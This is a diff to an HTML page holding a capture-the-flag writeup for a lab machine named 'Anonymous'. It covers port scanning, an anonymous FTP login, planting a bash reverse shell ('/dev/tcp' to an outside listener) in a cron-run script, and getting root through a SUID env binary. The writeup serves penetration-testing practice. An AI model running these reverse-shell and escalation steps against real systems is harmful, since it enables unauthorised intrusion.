@@ -42,16 +42,33 @@
 </head>
 <body>
   <h1>Anonymous</h1>
-  <p>Status: <strong>In progress...</strong></p>
+  <p>Status: <strong>Completed</strong></p>
 
   <h2>Enumeration</h2>
-  <p>In progress...</p>
+  <p><code>nmap -sV -T4 -oN scans/nmap_scan 10.10.221.140</code> shows ports <strong>21</strong>, <strong>22</strong>, <strong>139</strong>, and <strong>445</strong> open.</p>
+  <p>
+    <strong>Ports:</strong><br>
+    21 – FTP<br>
+    22 – SSH<br>
+    139 – NetBIOS<br>
+    445 – SMB
+  </p>
+  <p><code>smbclient -L //10.10.221.140//</code> reveals share: <strong>pics</strong><br>
+     Connects without password → download corgi images</p>
+  <p>FTP allows anonymous login → inside <code>scripts</code> folder find <code>clean.sh</code> for cron analysis</p>
 
   <h2>Exploitation</h2>
-  <p>In progress...</p>
+  <p>Modify <code>clean.sh</code> with reverse shell:</p>
+  <p><code>bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</code></p>
+  <p>Reupload via FTP → set <code>nc -lvnp 4242</code> listener → cron runs script → reverse shell as <strong>namelessone</strong></p>
 
   <h2>Privilege Escalation</h2>
-  <p>In progress...</p>
+  <p>Use <code>LinPEAS</code> to analyze system</p>
+  <p>Transfer via <code>python3 -m http.server 8888</code> + <code>wget</code></p>
+  <p>Make executable: <code>chmod +x linpeas.sh</code> → run it</p>
+  <p>Found SUID: <code>/usr/bin/env</code> → GTFOBins shows:</p>
+  <p><code>/usr/bin/env /bin/sh -p</code> gives root shell</p>
+  <p>Access <code>/root</code> → read <code>root.txt</code></p>
 
   <p><a href="../index.html">← Back to Writeups</a></p>
 </body>
